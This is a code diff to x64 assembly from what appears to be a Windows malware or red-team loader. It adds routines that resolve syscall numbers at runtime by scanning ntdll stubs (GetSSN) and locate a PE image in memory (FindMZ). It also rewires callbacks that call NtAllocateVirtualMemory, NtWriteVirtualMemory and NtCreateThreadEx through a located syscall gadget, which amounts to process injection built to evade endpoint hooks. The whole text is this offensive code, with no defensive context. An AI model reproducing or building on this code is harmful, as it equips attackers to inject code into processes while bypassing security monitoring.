@@ -5,6 +5,8 @@ add_rsp_ret dq 0000000000000000h
 
 section .text
 
+global FindMZ
+global GetSSN
 global Search_For_Syscall_Ret
 global Search_For_Add_Rsp_Ret
 global NtAllocateVirtualMemory_Callback
@@ -28,7 +30,7 @@ NtAllocateVirtualMemory_Callback:
     mov r10, rcx
     mov r15, syscall_ret
     mov r15, [r15]
-    mov rax, 18h
+    mov rax, [rbx + 0x28]
     jmp r15
 
 NtWriteVirtualMemory_Callback:
@@ -46,7 +48,7 @@ NtWriteVirtualMemory_Callback:
     mov r10, rcx
     mov r15, syscall_ret
     mov r15, [r15]
-    mov rax, 3Ah
+    mov rax, [rbx + 0x28]
     jmp r15
 
 NtCreateThreadEx_Callback:
@@ -76,7 +78,7 @@ NtCreateThreadEx_Callback:
     mov r10, rcx
     mov r15, syscall_ret
     mov r15, [r15]
-    mov rax, 0xC2
+    mov rax, [rbx + 0x58]
     jmp r15
 
 Search_For_Syscall_Ret:
@@ -112,4 +114,29 @@ Search_For_Add_Rsp_Ret:
     jne Search_For_Add_Rsp_Ret + 3h
     mov r15, add_rsp_ret
     mov [r15], rdx
+    ret
+
+FindMZ:
+    mov rbx, 0000000300905A4Dh
+    cmp rcx, 0
+    jne FindMZ + 1Ah
+    mov rcx, FindMZ - 30h
+    sub rcx, 1
+    mov rdx, [rcx]
+    cmp rbx, rdx
+    jne FindMZ + 1Ah
+    mov rax, rcx
+    ret
+
+GetSSN:
+    mov ebx, 0xB8D18B4C
+    mov rdx, 0x0
+    mov rax, [rcx]
+    cmp eax, ebx
+    je GetSSN + 0x1B
+    add rcx, 0x20
+    add rdx, 0x1
+    jmp GetSSN + 0xA
+    mov rax, [rcx + 0x4]
+    sub rax, rdx
     ret
